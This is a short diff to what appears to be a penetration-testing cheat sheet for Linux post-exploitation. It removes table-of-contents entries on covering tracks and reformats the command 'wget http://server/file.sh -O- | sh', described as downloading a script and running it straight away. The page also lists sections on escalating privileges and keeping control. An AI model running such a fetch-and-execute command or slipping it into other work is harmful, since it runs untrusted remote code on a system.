@@ -11,9 +11,7 @@
     - [Installed Packages](#packages)
     - [Package Sources](#packages_sources)
     - [Finding Important Files](#finding)
-- [Covering Your Tracks](#tracks)
-    - [Avoiding history filesmys](#avoid_history)
-    - [Deleting and Destroying](#destroy)
+
 - [Escalating](#escalating)
     - [Looking for possible opened paths](#paths)
 - [Maintaining control](#maintain)
@@ -291,7 +289,7 @@ Starting list sourced from: http://pentestmonkey.net/cheat-sheet/shells/reverse-
 <a name="remote_script"/><a>
 ### Execute a Remote Script
 
-wget http://server/file.sh -O- | sh  
+`wget http://server/file.sh -O- | sh`  
 This command forces the download of a file and immediately its execution
 
 
